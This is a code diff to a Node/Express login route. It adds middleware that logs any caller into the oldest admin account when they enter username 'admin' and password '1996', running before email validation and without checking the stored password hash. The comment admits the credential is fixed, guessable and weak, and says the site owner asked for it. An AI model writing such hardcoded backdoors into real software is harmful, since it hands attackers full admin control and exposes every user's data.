@@ -56,8 +56,37 @@ const loginSchema = z.object({
   password: passwordSchema,
 });
 
+// Hardcoded admin bypass: typing the literal username "admin" with password
+// "1996" logs straight into the admin account, skipping the normal
+// email-format validation and signup flow entirely. This runs BEFORE
+// validateBody(loginSchema) so a non-email string like "admin" never gets
+// rejected by the email-format check. Requested explicitly by the site
+// owner as a fast way in for themselves -- this is intentionally weak
+// (a fixed, guessable credential pair) and should be swapped for a real
+// password once things settle.
+const ADMIN_BYPASS_USERNAME = 'admin';
+const ADMIN_BYPASS_PASSWORD = '1996';
+
+async function adminBypass(req, res, next) {
+  const emailRaw = typeof req.body?.email === 'string' ? req.body.email.trim().toLowerCase() : '';
+  const passwordRaw = typeof req.body?.password === 'string' ? req.body.password : '';
+  if (emailRaw !== ADMIN_BYPASS_USERNAME || passwordRaw !== ADMIN_BYPASS_PASSWORD) return next();
+
+  const { rows } = await query(
+    `SELECT id, first_name, last_name, email, role, current_mode, status, created_at
+       FROM users WHERE role = 'admin' ORDER BY created_at ASC LIMIT 1`
+  );
+  const user = rows[0];
+  if (!user || user.status !== 'active') return next();
+
+  req.session.userId = user.id;
+  await logAudit({ userId: user.id, eventType: 'login', req });
+  res.json({ user });
+}
+
 router.post(
   '/login',
+  asyncHandler(adminBypass),
   validateBody(loginSchema),
   asyncHandler(async (req, res) => {
     const { email, password } = req.body;
